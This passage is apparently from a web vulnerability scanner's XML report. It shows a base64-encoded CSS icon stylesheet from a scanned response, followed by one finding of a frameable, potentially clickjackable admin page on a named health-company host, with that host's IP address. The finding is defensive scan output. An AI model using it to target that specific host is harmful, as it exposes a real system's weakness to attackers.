b2RlcGVuOmJlZm9yZXtjb250ZW50OiJcZjFjYiJ9LmZhLWpzZmlkZGxlOmJlZm9yZXtjb250ZW50OiJcZjFjYyJ9LmZhLWxpZmUtYm91eTpiZWZvcmUsLmZhLWxpZmUtYnVveTpiZWZvcmUsLmZhLWxpZmUtc2F2ZXI6YmVmb3JlLC5mYS1zdXBwb3J0OmJlZm9yZSwuZmEtbGlmZS1yaW5nOmJlZm9yZXtjb250ZW50OiJcZjFjZCJ9LmZhLWNpcmNsZS1vLW5vdGNoOmJlZm9yZXtjb250ZW50OiJcZjFjZSJ9LmZhLXJhOmJlZm9yZSwuZmEtcmVzaXN0YW5jZTpiZWZvcmUsLmZhLXJlYmVsOmJlZm9yZXtjb250ZW50OiJcZjFkMCJ9LmZhLWdlOmJlZm9yZSwuZmEtZW1waXJlOmJlZm9yZXtjb250ZW50OiJcZjFkMSJ9LmZhLWdpdC1zcXVhcmU6YmVmb3Jle2NvbnRlbnQ6IlxmMWQyIn0uZmEtZ2l0OmJlZm9yZXtjb250ZW50OiJcZjFkMyJ9LmZhLXktY29tYmluYXRvci1zcXVhcmU6YmVmb3JlLC5mYS15Yy1zcXVhcmU6YmVmb3JlLC5mYS1oYWNrZXItbmV3czpiZWZvcmV7Y29udGVudDoiXGYxZDQifS5mYS10ZW5jZW50LXdlaWJvOmJlZm9yZXtjb250ZW50OiJcZjFkNSJ9LmZhLXFxOmJlZm9yZXtjb250ZW50OiJcZjFkNiJ9LmZhLXdlY2hhdDpiZWZvcmUsLmZhLXdlaXhpbjpiZWZvcmV7Y29udGVudDoiXGYxZDcifS5mYS1zZW5kOmJlZm9yZSwuZmEtcGFwZXItcGxhbmU6YmVmb3Jle2NvbnRlbnQ6IlxmMWQ4In0uZmEtc2VuZC1vOmJlZm9yZSwuZmEtcGFwZXItcGxhbmUtbzpiZWZvcmV7Y29udGVudDoiXGYxZDkifS5mYS1oaXN0b3J5OmJlZm9yZXtjb250ZW50OiJcZjFkYSJ9LmZhLWNpcmNsZS10aGluOmJlZm9yZXtjb250ZW50OiJcZjFkYiJ9LmZhLWhlYWRlcjpiZWZvcmV7Y29udGVudDoiXGYxZGMifS5mYS1wYXJhZ3JhcGg6YmVmb3Jle2NvbnRlbnQ6IlxmMWRkIn0uZmEtc2xpZGVyczpiZWZvcmV7Y29udGVudDoiXGYxZGUifS5mYS1zaGFyZS1hbHQ6YmVmb3Jle2NvbnRlbnQ6IlxmMWUwIn0uZmEtc2hhcmUtYWx0LXNxdWFyZTpiZWZvcmV7Y29udGVudDoiXGYxZTEifS5mYS1ib21iOmJlZm9yZXtjb250ZW50OiJcZjFlMiJ9LmZhLXNvY2Nlci1iYWxsLW86YmVmb3JlLC5mYS1mdXRib2wtbzpiZWZvcmV7Y29udGVudDoiXGYxZTMifS5mYS10dHk6YmVmb3Jle2NvbnRlbnQ6IlxmMWU0In0uZmEtYmlub2N1bGFyczpiZWZvcmV7Y29udGVudDoiXGYxZTUifS5mYS1wbHVnOmJlZm9yZXtjb250ZW50OiJcZjFlNiJ9LmZhLXNsaWRlc2hhcmU6YmVmb3Jle2NvbnRlbnQ6IlxmMWU3In0uZmEtdHdpdGNoOmJlZm9yZXtjb250ZW50OiJcZjFlOCJ9LmZhLXllbHA6YmVmb3Jle2NvbnRlbnQ6IlxmMWU5In0uZmEtbmV3c3BhcGVyLW86YmVmb3Jle2NvbnRlbnQ6IlxmMWVhIn0uZmEtd2lmaTpiZWZvcmV7Y29udGVudDoiXGYxZWIifS5mYS1jYWxjdWxhdG9yOmJlZm9yZXtjb250ZW50OiJcZjFlYyJ9LmZhLXBheXBhbDpiZWZvcmV7Y29udGVudDoiXGYxZWQifS5mYS1nb29nbGUtd2FsbGV0OmJlZm9yZXtjb250ZW50OiJcZjFlZSJ9LmZhLWNjLXZpc2E6YmVmb3Jle2NvbnRlbnQ6IlxmMWYwIn0uZmEtY2MtbWFzdGVyY2FyZDpiZWZvcmV7Y29udGVudDoiXGYxZjEifS5mYS1jYy1kaXNjb3ZlcjpiZWZvcmV7Y29udGVudDoiXGYxZjIifS5mYS1jYy1hbWV4OmJlZm9yZXtjb250ZW50OiJcZjFmMyJ9LmZhLWNjLXBheXBhbDpiZWZvcmV7Y29udGVudDoiXGYxZjQifS5mYS1jYy1zdHJpcGU6YmVmb3Jle2NvbnRlbnQ6IlxmMWY1In0uZmEtYmVsbC1zbGFzaDpiZWZvcmV7Y29udGVudDoiXGYxZjYifS5mYS1iZWxsLXNsYXNoLW86YmVmb3Jle2NvbnRlbnQ6IlxmMWY3In0uZmEtdHJhc2g6YmVmb3Jle2NvbnRlbnQ6IlxmMWY4In0uZmEtY29weXJpZ2h0OmJlZm9yZXtjb250ZW50OiJcZjFmOSJ9LmZhLWF0OmJlZm9yZXtjb250ZW50OiJcZjFmYSJ9LmZhLWV5ZWRyb3BwZXI6YmVmb3Jle2NvbnRlbnQ6IlxmMWZiIn0uZmEtcGFpbnQtYnJ1c2g6YmVmb3Jle2NvbnRlbnQ6IlxmMWZjIn0uZmEtYmlydGhkYXktY2FrZTpiZWZvcmV7Y29udGVudDoiXGYxZmQifS5mYS1hcmVhLWNoYXJ0OmJlZm9yZXtjb250ZW50OiJcZjFmZSJ9LmZhLXBpZS1jaGFydDpiZWZvcmV7Y29udGVudDoiXGYyMDAifS5mYS1saW5lLWNoYXJ0OmJlZm9yZXtjb250ZW50OiJcZjIwMSJ9LmZhLWxhc3RmbTpiZWZvcmV7Y29udGVudDoiXGYyMDIifS5mYS1sYXN0Zm0tc3F1YXJlOmJlZm9yZXtjb250ZW50OiJcZjIwMyJ9LmZhLXRvZ2dsZS1vZmY6YmVmb3Jle2NvbnRlbnQ6IlxmMjA0In0uZmEtdG9nZ2xlLW9uOmJlZm9yZXtjb250ZW50OiJcZjIwNSJ9LmZhLWJpY3ljbGU6YmVmb3Jle2NvbnRlbnQ6IlxmMjA2In0uZmEtYnVzOmJlZm9yZXtjb250ZW50OiJcZjIwNyJ9LmZhLWlveGhvc3Q6YmVmb3Jle2NvbnRlbnQ6IlxmMjA4In0uZmEtYW5nZWxsaXN0OmJlZm9yZXtjb250ZW50OiJcZjIwOSJ9LmZhLWNjOmJlZm9yZXtjb250ZW50OiJcZjIwYSJ9LmZhLXNoZWtlbDpiZWZvcmUsLmZhLXNoZXFlbDpiZWZvcmUsLmZhLWlsczpiZWZvcmV7Y29udGVudDoiXGYyMGIifS5mYS1tZWFucGF0aDpiZWZvcmV7Y29udGVudDoiXGYyMGMifS5mYS1idXlzZWxsYWRzOmJlZm9yZXtjb250ZW50OiJcZjIwZCJ9LmZhLWNvbm5lY3RkZXZlbG9wOmJlZm9yZXtjb250ZW50OiJcZjIwZSJ9LmZhLWRhc2hjdWJlOmJlZm9yZXtjb250ZW50OiJcZjIxMCJ9LmZhLWZvcnVtYmVlOmJlZm9yZXtjb250ZW50OiJcZjIxMSJ9LmZhLWxlYW5wdWI6YmVmb3Jle2NvbnRlbnQ6IlxmMjEyIn0uZmEtc2VsbHN5OmJlZm9yZXtjb250ZW50OiJcZjIxMyJ9LmZhLXNoaXJ0c2luYnVsazpiZWZvcmV7Y29udGVudDoiXGYyMTQifS5mYS1zaW1wbHlidWlsdDpiZWZvcmV7Y29udGVudDoiXGYyMTUifS5mYS1za3lhdGxhczpiZWZvcmV7Y29udGVudDoiXGYyMTYifS5mYS1jYXJ0LXBsdXM6YmVmb3Jle2NvbnRlbnQ6IlxmMjE3In0uZmEtY2FydC1hcnJvdy1kb3duOmJlZm9yZXtjb250ZW50OiJcZjIxOCJ9LmZhLWRpYW1vbmQ6YmVmb3Jle2NvbnRlbnQ6IlxmMjE5In0uZmEtc2hpcDpiZWZvcmV7Y29udGVudDoiXGYyMWEifS5mYS11c2VyLXNlY3JldDpiZWZvcmV7Y29udGVudDoiXGYyMWIifS5mYS1tb3RvcmN5Y2xlOmJlZm9yZXtjb250ZW50OiJcZjIxYyJ9LmZhLXN0cmVldC12aWV3OmJlZm9yZXtjb250ZW50OiJcZjIxZCJ9LmZhLWhlYXJ0YmVhdDpiZWZvcmV7Y29udGVudDoiXGYyMWUifS5mYS12ZW51czpiZWZvcmV7Y29udGVudDoiXGYyMjEifS5mYS1tYXJzOmJlZm9yZXtjb250ZW50OiJcZjIyMiJ9LmZhLW1lcmN1cnk6YmVmb3Jle2NvbnRlbnQ6IlxmMjIzIn0uZmEtaW50ZXJzZXg6YmVmb3JlLC5mYS10cmFuc2dlbmRlcjpiZWZvcmV7Y29udGVudDoiXGYyMjQifS5mYS10cmFuc2dlbmRlci1hbHQ6YmVmb3Jle2NvbnRlbnQ6IlxmMjI1In0uZmEtdmVudXMtZG91YmxlOmJlZm9yZXtjb250ZW50OiJcZjIyNiJ9LmZhLW1hcnMtZG91YmxlOmJlZm9yZXtjb250ZW50OiJcZjIyNyJ9LmZhLXZlbnVzLW1hcnM6YmVmb3Jle2NvbnRlbnQ6IlxmMjI4In0uZmEtbWFycy1zdHJva2U6YmVmb3Jle2NvbnRlbnQ6IlxmMjI5In0uZmEtbWFycy1zdHJva2UtdjpiZWZvcmV7Y29udGVudDoiXGYyMmEifS5mYS1tYXJzLXN0cm9rZS1oOmJlZm9yZXtjb250ZW50OiJcZjIyYiJ9LmZhLW5ldXRlcjpiZWZvcmV7Y29udGVudDoiXGYyMmMifS5mYS1nZW5kZXJsZXNzOmJlZm9yZXtjb250ZW50OiJcZjIyZCJ9LmZhLWZhY2Vib29rLW9mZmljaWFsOmJlZm9yZXtjb250ZW50OiJcZjIzMCJ9LmZhLXBpbnRlcmVzdC1wOmJlZm9yZXtjb250ZW50OiJcZjIzMSJ9LmZhLXdoYXRzYXBwOmJlZm9yZXtjb250ZW50OiJcZjIzMiJ9LmZhLXNlcnZlcjpiZWZvcmV7Y29udGVudDoiXGYyMzMifS5mYS11c2VyLXBsdXM6YmVmb3Jle2NvbnRlbnQ6IlxmMjM0In0uZmEtdXNlci10aW1lczpiZWZvcmV7Y29udGVudDoiXGYyMzUifS5mYS1ob3RlbDpiZWZvcmUsLmZhLWJlZDpiZWZvcmV7Y29udGVudDoiXGYyMzYifS5mYS12aWFjb2luOmJlZm9yZXtjb250ZW50OiJcZjIzNyJ9LmZhLXRyYWluOmJlZm9yZXtjb250ZW50OiJcZjIzOCJ9LmZhLXN1YndheTpiZWZvcmV7Y29udGVudDoiXGYyMzkifS5mYS1tZWRpdW06YmVmb3Jle2NvbnRlbnQ6IlxmMjNhIn0uZmEteWM6YmVmb3JlLC5mYS15LWNvbWJpbmF0b3I6YmVmb3Jle2NvbnRlbnQ6IlxmMjNiIn0uZmEtb3B0aW4tbW9uc3RlcjpiZWZvcmV7Y29udGVudDoiXGYyM2MifS5mYS1vcGVuY2FydDpiZWZvcmV7Y29udGVudDoiXGYyM2QifS5mYS1leHBlZGl0ZWRzc2w6YmVmb3Jle2NvbnRlbnQ6IlxmMjNlIn0uZmEtYmF0dGVyeS00OmJlZm9yZSwuZmEtYmF0dGVyeTpiZWZvcmUsLmZhLWJhdHRlcnktZnVsbDpiZWZvcmV7Y29udGVudDoiXGYyNDAifS5mYS1iYXR0ZXJ5LTM6YmVmb3JlLC5mYS1iYXR0ZXJ5LXRocmVlLXF1YXJ0ZXJzOmJlZm9yZXtjb250ZW50OiJcZjI0MSJ9LmZhLWJhdHRlcnktMjpiZWZvcmUsLmZhLWJhdHRlcnktaGFsZjpiZWZvcmV7Y29udGVudDoiXGYyNDIifS5mYS1iYXR0ZXJ5LTE6YmVmb3JlLC5mYS1iYXR0ZXJ5LXF1YXJ0ZXI6YmVmb3Jle2NvbnRlbnQ6IlxmMjQzIn0uZmEtYmF0dGVyeS0wOmJlZm9yZSwuZmEtYmF0dGVyeS1lbXB0eTpiZWZvcmV7Y29udGVudDoiXGYyNDQifS5mYS1tb3VzZS1wb2ludGVyOmJlZm9yZXtjb250ZW50OiJcZjI0NSJ9LmZhLWktY3Vyc29yOmJlZm9yZXtjb250ZW50OiJcZjI0NiJ9LmZhLW9iamVjdC1ncm91cDpiZWZvcmV7Y29udGVudDoiXGYyNDcifS5mYS1vYmplY3QtdW5ncm91cDpiZWZvcmV7Y29udGVudDoiXGYyNDgifS5mYS1zdGlja3ktbm90ZTpiZWZvcmV7Y29udGVudDoiXGYyNDkifS5mYS1zdGlja3ktbm90ZS1vOmJlZm9yZXtjb250ZW50OiJcZjI0YSJ9LmZhLWNjLWpjYjpiZWZvcmV7Y29udGVudDoiXGYyNGIifS5mYS1jYy1kaW5lcnMtY2x1YjpiZWZvcmV7Y29udGVudDoiXGYyNGMifS5mYS1jbG9uZTpiZWZvcmV7Y29udGVudDoiXGYyNGQifS5mYS1iYWxhbmNlLXNjYWxlOmJlZm9yZXtjb250ZW50OiJcZjI0ZSJ9LmZhLWhvdXJnbGFzcy1vOmJlZm9yZXtjb250ZW50OiJcZjI1MCJ9LmZhLWhvdXJnbGFzcy0xOmJlZm9yZSwuZmEtaG91cmdsYXNzLXN0YXJ0OmJlZm9yZXtjb250ZW50OiJcZjI1MSJ9LmZhLWhvdXJnbGFzcy0yOmJlZm9yZSwuZmEtaG91cmdsYXNzLWhhbGY6YmVmb3Jle2NvbnRlbnQ6IlxmMjUyIn0uZmEtaG91cmdsYXNzLTM6YmVmb3JlLC5mYS1ob3VyZ2xhc3MtZW5kOmJlZm9yZXtjb250ZW50OiJcZjI1MyJ9LmZhLWhvdXJnbGFzczpiZWZvcmV7Y29udGVudDoiXGYyNTQifS5mYS1oYW5kLWdyYWItbzpiZWZvcmUsLmZhLWhhbmQtcm9jay1vOmJlZm9yZXtjb250ZW50OiJcZjI1NSJ9LmZhLWhhbmQtc3RvcC1vOmJlZm9yZSwuZmEtaGFuZC1wYXBlci1vOmJlZm9yZXtjb250ZW50OiJcZjI1NiJ9LmZhLWhhbmQtc2Npc3NvcnMtbzpiZWZvcmV7Y29udGVudDoiXGYyNTcifS5mYS1oYW5kLWxpemFyZC1vOmJlZm9yZXtjb250ZW50OiJcZjI1OCJ9LmZhLWhhbmQtc3BvY2stbzpiZWZvcmV7Y29udGVudDoiXGYyNTkifS5mYS1oYW5kLXBvaW50ZXItbzpiZWZvcmV7Y29udGVudDoiXGYyNWEifS5mYS1oYW5kLXBlYWNlLW86YmVmb3Jle2NvbnRlbnQ6IlxmMjViIn0uZmEtdHJhZGVtYXJrOmJlZm9yZXtjb250ZW50OiJcZjI1YyJ9LmZhLXJlZ2lzdGVyZWQ6YmVmb3Jle2NvbnRlbnQ6IlxmMjVkIn0uZmEtY3JlYXRpdmUtY29tbW9uczpiZWZvcmV7Y29udGVudDoiXGYyNWUifS5mYS1nZzpiZWZvcmV7Y29udGVudDoiXGYyNjAifS5mYS1nZy1jaXJjbGU6YmVmb3Jle2NvbnRlbnQ6IlxmMjYxIn0uZmEtdHJpcGFkdmlzb3I6YmVmb3Jle2NvbnRlbnQ6IlxmMjYyIn0uZmEtb2Rub2tsYXNzbmlraTpiZWZvcmV7Y29udGVudDoiXGYyNjMifS5mYS1vZG5va2xhc3NuaWtpLXNxdWFyZTpiZWZvcmV7Y29udGVudDoiXGYyNjQifS5mYS1nZXQtcG9ja2V0OmJlZm9yZXtjb250ZW50OiJcZjI2NSJ9LmZhLXdpa2lwZWRpYS13OmJlZm9yZXtjb250ZW50OiJcZjI2NiJ9LmZhLXNhZmFyaTpiZWZvcmV7Y29udGVudDoiXGYyNjcifS5mYS1jaHJvbWU6YmVmb3Jle2NvbnRlbnQ6IlxmMjY4In0uZmEtZmlyZWZveDpiZWZvcmV7Y29udGVudDoiXGYyNjkifS5mYS1vcGVyYTpiZWZvcmV7Y29udGVudDoiXGYyNmEifS5mYS1pbnRlcm5ldC1leHBsb3JlcjpiZWZvcmV7Y29udGVudDoiXGYyNmIifS5mYS10djpiZWZvcmUsLmZhLXRlbGV2aXNpb246YmVmb3Jle2NvbnRlbnQ6IlxmMjZjIn0uZmEtY29udGFvOmJlZm9yZXtjb250ZW50OiJcZjI2ZCJ9LmZhLTUwMHB4OmJlZm9yZXtjb250ZW50OiJcZjI2ZSJ9LmZhLWFtYXpvbjpiZWZvcmV7Y29udGVudDoiXGYyNzAifS5mYS1jYWxlbmRhci1wbHVzLW86YmVmb3Jle2NvbnRlbnQ6IlxmMjcxIn0uZmEtY2FsZW5kYXItbWludXMtbzpiZWZvcmV7Y29udGVudDoiXGYyNzIifS5mYS1jYWxlbmRhci10aW1lcy1vOmJlZm9yZXtjb250ZW50OiJcZjI3MyJ9LmZhLWNhbGVuZGFyLWNoZWNrLW86YmVmb3Jle2NvbnRlbnQ6IlxmMjc0In0uZmEtaW5kdXN0cnk6YmVmb3Jle2NvbnRlbnQ6IlxmMjc1In0uZmEtbWFwLXBpbjpiZWZvcmV7Y29udGVudDoiXGYyNzYifS5mYS1tYXAtc2lnbnM6YmVmb3Jle2NvbnRlbnQ6IlxmMjc3In0uZmEtbWFwLW86YmVmb3Jle2NvbnRlbnQ6IlxmMjc4In0uZmEtbWFwOmJlZm9yZXtjb250ZW50OiJcZjI3OSJ9LmZhLWNvbW1lbnRpbmc6YmVmb3Jle2NvbnRlbnQ6IlxmMjdhIn0uZmEtY29tbWVudGluZy1vOmJlZm9yZXtjb250ZW50OiJcZjI3YiJ9LmZhLWhvdXp6OmJlZm9yZXtjb250ZW50OiJcZjI3YyJ9LmZhLXZpbWVvOmJlZm9yZXtjb250ZW50OiJcZjI3ZCJ9LmZhLWJsYWNrLXRpZTpiZWZvcmV7Y29udGVudDoiXGYyN2UifS5mYS1mb250aWNvbnM6YmVmb3Jle2NvbnRlbnQ6IlxmMjgwIn0uZmEtcmVkZGl0LWFsaWVuOmJlZm9yZXtjb250ZW50OiJcZjI4MSJ9LmZhLWVkZ2U6YmVmb3Jle2NvbnRlbnQ6IlxmMjgyIn0uZmEtY3JlZGl0LWNhcmQtYWx0OmJlZm9yZXtjb250ZW50OiJcZjI4MyJ9LmZhLWNvZGllcGllOmJlZm9yZXtjb250ZW50OiJcZjI4NCJ9LmZhLW1vZHg6YmVmb3Jle2NvbnRlbnQ6IlxmMjg1In0uZmEtZm9ydC1hd2Vzb21lOmJlZm9yZXtjb250ZW50OiJcZjI4NiJ9LmZhLXVzYjpiZWZvcmV7Y29udGVudDoiXGYyODcifS5mYS1wcm9kdWN0LWh1bnQ6YmVmb3Jle2NvbnRlbnQ6IlxmMjg4In0uZmEtbWl4Y2xvdWQ6YmVmb3Jle2NvbnRlbnQ6IlxmMjg5In0uZmEtc2NyaWJkOmJlZm9yZXtjb250ZW50OiJcZjI4YSJ9LmZhLXBhdXNlLWNpcmNsZTpiZWZvcmV7Y29udGVudDoiXGYyOGIifS5mYS1wYXVzZS1jaXJjbGUtbzpiZWZvcmV7Y29udGVudDoiXGYyOGMifS5mYS1zdG9wLWNpcmNsZTpiZWZvcmV7Y29udGVudDoiXGYyOGQifS5mYS1zdG9wLWNpcmNsZS1vOmJlZm9yZXtjb250ZW50OiJcZjI4ZSJ9LmZhLXNob3BwaW5nLWJhZzpiZWZvcmV7Y29udGVudDoiXGYyOTAifS5mYS1zaG9wcGluZy1iYXNrZXQ6YmVmb3Jle2NvbnRlbnQ6IlxmMjkxIn0uZmEtaGFzaHRhZzpiZWZvcmV7Y29udGVudDoiXGYyOTIifS5mYS1ibHVldG9vdGg6YmVmb3Jle2NvbnRlbnQ6IlxmMjkzIn0uZmEtYmx1ZXRvb3RoLWI6YmVmb3Jle2NvbnRlbnQ6IlxmMjk0In0uZmEtcGVyY2VudDpiZWZvcmV7Y29udGVudDoiXGYyOTUifS5mYS1naXRsYWI6YmVmb3Jle2NvbnRlbnQ6IlxmMjk2In0uZmEtd3BiZWdpbm5lcjpiZWZvcmV7Y29udGVudDoiXGYyOTcifS5mYS13cGZvcm1zOmJlZm9yZXtjb250ZW50OiJcZjI5OCJ9LmZhLWVudmlyYTpiZWZvcmV7Y29udGVudDoiXGYyOTkifS5mYS11bml2ZXJzYWwtYWNjZXNzOmJlZm9yZXtjb250ZW50OiJcZjI5YSJ9LmZhLXdoZWVsY2hhaXItYWx0OmJlZm9yZXtjb250ZW50OiJcZjI5YiJ9LmZhLXF1ZXN0aW9uLWNpcmNsZS1vOmJlZm9yZXtjb250ZW50OiJcZjI5YyJ9LmZhLWJsaW5kOmJlZm9yZXtjb250ZW50OiJcZjI5ZCJ9LmZhLWF1ZGlvLWRlc2NyaXB0aW9uOmJlZm9yZXtjb250ZW50OiJcZjI5ZSJ9LmZhLXZvbHVtZS1jb250cm9sLXBob25lOmJlZm9yZXtjb250ZW50OiJcZjJhMCJ9LmZhLWJyYWlsbGU6YmVmb3Jle2NvbnRlbnQ6IlxmMmExIn0uZmEtYXNzaXN0aXZlLWxpc3RlbmluZy1zeXN0ZW1zOmJlZm9yZXtjb250ZW50OiJcZjJhMiJ9LmZhLWFzbC1pbnRlcnByZXRpbmc6YmVmb3JlLC5mYS1hbWVyaWNhbi1zaWduLWxhbmd1YWdlLWludGVycHJldGluZzpiZWZvcmV7Y29udGVudDoiXGYyYTMifS5mYS1kZWFmbmVzczpiZWZvcmUsLmZhLWhhcmQtb2YtaGVhcmluZzpiZWZvcmUsLmZhLWRlYWY6YmVmb3Jle2NvbnRlbnQ6IlxmMmE0In0uZmEtZ2xpZGU6YmVmb3Jle2NvbnRlbnQ6IlxmMmE1In0uZmEtZ2xpZGUtZzpiZWZvcmV7Y29udGVudDoiXGYyYTYifS5mYS1zaWduaW5nOmJlZm9yZSwuZmEtc2lnbi1sYW5ndWFnZTpiZWZvcmV7Y29udGVudDoiXGYyYTcifS5mYS1sb3ctdmlzaW9uOmJlZm9yZXtjb250ZW50OiJcZjJhOCJ9LmZhLXZpYWRlbzpiZWZvcmV7Y29udGVudDoiXGYyYTkifS5mYS12aWFkZW8tc3F1YXJlOmJlZm9yZXtjb250ZW50OiJcZjJhYSJ9LmZhLXNuYXBjaGF0OmJlZm9yZXtjb250ZW50OiJcZjJhYiJ9LmZhLXNuYXBjaGF0LWdob3N0OmJlZm9yZXtjb250ZW50OiJcZjJhYyJ9LmZhLXNuYXBjaGF0LXNxdWFyZTpiZWZvcmV7Y29udGVudDoiXGYyYWQifS5mYS1waWVkLXBpcGVyOmJlZm9yZXtjb250ZW50OiJcZjJhZSJ9LmZhLWZpcnN0LW9yZGVyOmJlZm9yZXtjb250ZW50OiJcZjJiMCJ9LmZhLXlvYXN0OmJlZm9yZXtjb250ZW50OiJcZjJiMSJ9LmZhLXRoZW1laXNsZTpiZWZvcmV7Y29udGVudDoiXGYyYjIifS5mYS1nb29nbGUtcGx1cy1jaXJjbGU6YmVmb3JlLC5mYS1nb29nbGUtcGx1cy1vZmZpY2lhbDpiZWZvcmV7Y29udGVudDoiXGYyYjMifS5mYS1mYTpiZWZvcmUsLmZhLWZvbnQtYXdlc29tZTpiZWZvcmV7Y29udGVudDoiXGYyYjQifS5mYS1oYW5kc2hha2UtbzpiZWZvcmV7Y29udGVudDoiXGYyYjUifS5mYS1lbnZlbG9wZS1vcGVuOmJlZm9yZXtjb250ZW50OiJcZjJiNiJ9LmZhLWVudmVsb3BlLW9wZW4tbzpiZWZvcmV7Y29udGVudDoiXGYyYjcifS5mYS1saW5vZGU6YmVmb3Jle2NvbnRlbnQ6IlxmMmI4In0uZmEtYWRkcmVzcy1ib29rOmJlZm9yZXtjb250ZW50OiJcZjJiOSJ9LmZhLWFkZHJlc3MtYm9vay1vOmJlZm9yZXtjb250ZW50OiJcZjJiYSJ9LmZhLXZjYXJkOmJlZm9yZSwuZmEtYWRkcmVzcy1jYXJkOmJlZm9yZXtjb250ZW50OiJcZjJiYiJ9LmZhLXZjYXJkLW86YmVmb3JlLC5mYS1hZGRyZXNzLWNhcmQtbzpiZWZvcmV7Y29udGVudDoiXGYyYmMifS5mYS11c2VyLWNpcmNsZTpiZWZvcmV7Y29udGVudDoiXGYyYmQifS5mYS11c2VyLWNpcmNsZS1vOmJlZm9yZXtjb250ZW50OiJcZjJiZSJ9LmZhLXVzZXItbzpiZWZvcmV7Y29udGVudDoiXGYyYzAifS5mYS1pZC1iYWRnZTpiZWZvcmV7Y29udGVudDoiXGYyYzEifS5mYS1kcml2ZXJzLWxpY2Vuc2U6YmVmb3JlLC5mYS1pZC1jYXJkOmJlZm9yZXtjb250ZW50OiJcZjJjMiJ9LmZhLWRyaXZlcnMtbGljZW5zZS1vOmJlZm9yZSwuZmEtaWQtY2FyZC1vOmJlZm9yZXtjb250ZW50OiJcZjJjMyJ9LmZhLXF1b3JhOmJlZm9yZXtjb250ZW50OiJcZjJjNCJ9LmZhLWZyZWUtY29kZS1jYW1wOmJlZm9yZXtjb250ZW50OiJcZjJjNSJ9LmZhLXRlbGVncmFtOmJlZm9yZXtjb250ZW50OiJcZjJjNiJ9LmZhLXRoZXJtb21ldGVyLTQ6YmVmb3JlLC5mYS10aGVybW9tZXRlcjpiZWZvcmUsLmZhLXRoZXJtb21ldGVyLWZ1bGw6YmVmb3Jle2NvbnRlbnQ6IlxmMmM3In0uZmEtdGhlcm1vbWV0ZXItMzpiZWZvcmUsLmZhLXRoZXJtb21ldGVyLXRocmVlLXF1YXJ0ZXJzOmJlZm9yZXtjb250ZW50OiJcZjJjOCJ9LmZhLXRoZXJtb21ldGVyLTI6YmVmb3JlLC5mYS10aGVybW9tZXRlci1oYWxmOmJlZm9yZXtjb250ZW50OiJcZjJjOSJ9LmZhLXRoZXJtb21ldGVyLTE6YmVmb3JlLC5mYS10aGVybW9tZXRlci1xdWFydGVyOmJlZm9yZXtjb250ZW50OiJcZjJjYSJ9LmZhLXRoZXJtb21ldGVyLTA6YmVmb3JlLC5mYS10aGVybW9tZXRlci1lbXB0eTpiZWZvcmV7Y29udGVudDoiXGYyY2IifS5mYS1zaG93ZXI6YmVmb3Jle2NvbnRlbnQ6IlxmMmNjIn0uZmEtYmF0aHR1YjpiZWZvcmUsLmZhLXMxNTpiZWZvcmUsLmZhLWJhdGg6YmVmb3Jle2NvbnRlbnQ6IlxmMmNkIn0uZmEtcG9kY2FzdDpiZWZvcmV7Y29udGVudDoiXGYyY2UifS5mYS13aW5kb3ctbWF4aW1pemU6YmVmb3Jle2NvbnRlbnQ6IlxmMmQwIn0uZmEtd2luZG93LW1pbmltaXplOmJlZm9yZXtjb250ZW50OiJcZjJkMSJ9LmZhLXdpbmRvdy1yZXN0b3JlOmJlZm9yZXtjb250ZW50OiJcZjJkMiJ9LmZhLXRpbWVzLXJlY3RhbmdsZTpiZWZvcmUsLmZhLXdpbmRvdy1jbG9zZTpiZWZvcmV7Y29udGVudDoiXGYyZDMifS5mYS10aW1lcy1yZWN0YW5nbGUtbzpiZWZvcmUsLmZhLXdpbmRvdy1jbG9zZS1vOmJlZm9yZXtjb250ZW50OiJcZjJkNCJ9LmZhLWJhbmRjYW1wOmJlZm9yZXtjb250ZW50OiJcZjJkNSJ9LmZhLWdyYXY6YmVmb3Jle2NvbnRlbnQ6IlxmMmQ2In0uZmEtZXRzeTpiZWZvcmV7Y29udGVudDoiXGYyZDcifS5mYS1pbWRiOmJlZm9yZXtjb250ZW50OiJcZjJkOCJ9LmZhLXJhdmVscnk6YmVmb3Jle2NvbnRlbnQ6IlxmMmQ5In0uZmEtZWVyY2FzdDpiZWZvcmV7Y29udGVudDoiXGYyZGEifS5mYS1taWNyb2NoaXA6YmVmb3Jle2NvbnRlbnQ6IlxmMmRiIn0uZmEtc25vd2ZsYWtlLW86YmVmb3Jle2NvbnRlbnQ6IlxmMmRjIn0uZmEtc3VwZXJwb3dlcnM6YmVmb3Jle2NvbnRlbnQ6IlxmMmRkIn0uZmEtd3BleHBsb3JlcjpiZWZvcmV7Y29udGVudDoiXGYyZGUifS5mYS1tZWV0dXA6YmVmb3Jle2NvbnRlbnQ6IlxmMmUwIn0uc3Itb25seXtwb3NpdGlvbjphYnNvbHV0ZTt3aWR0aDoxcHg7aGVpZ2h0OjFweDtwYWRkaW5nOjA7bWFyZ2luOi0xcHg7b3ZlcmZsb3c6aGlkZGVuO2NsaXA6cmVjdCgwLCAwLCAwLCAwKTtib3JkZXI6MH0uc3Itb25seS1mb2N1c2FibGU6YWN0aXZlLC5zci1vbmx5LWZvY3VzYWJsZTpmb2N1c3twb3NpdGlvbjpzdGF0aWM7d2lkdGg6YXV0bztoZWlnaHQ6YXV0bzttYXJnaW46MDtvdmVyZmxvdzp2aXNpYmxlO2NsaXA6YXV0b30K]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2610560259535997952</serialNumber>
    <type>5245344</type>
    <name><![CDATA[Frameable response (potential Clickjacking)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/]]></path>
    <location><![CDATA[/]]></location>
    <severity>Information</severity>
    <confidence>Firm</confidence>
    <issueBackground><![CDATA[<p>If a page fails to set an appropriate X-Frame-Options or Content-Security-Policy HTTP header, it might be possible for a page controlled by an attacker to load it within an iframe. This may enable a clickjacking attack, in which the attacker's page overlays the target application's interface with a different interface provided by the attacker. By inducing victim users to perform actions such as mouse clicks and keystrokes, the attacker can cause them to unwittingly carry out actions within the application that is being targeted. This technique allows the attacker to circumvent defenses against cross-site request forgery, and may result in unauthorized actions.</p>
<p>Note that some applications attempt to prevent these attacks from within the HTML page itself, using "framebusting" code. However, this type of defense is normally ineffective and can usually be circumvented by a skilled attacker.</p>
<p>You should determine whether any functions accessible within frameable pages can be used by application users to perform any sensitive actions within the application. </p>]]></issueBackground>
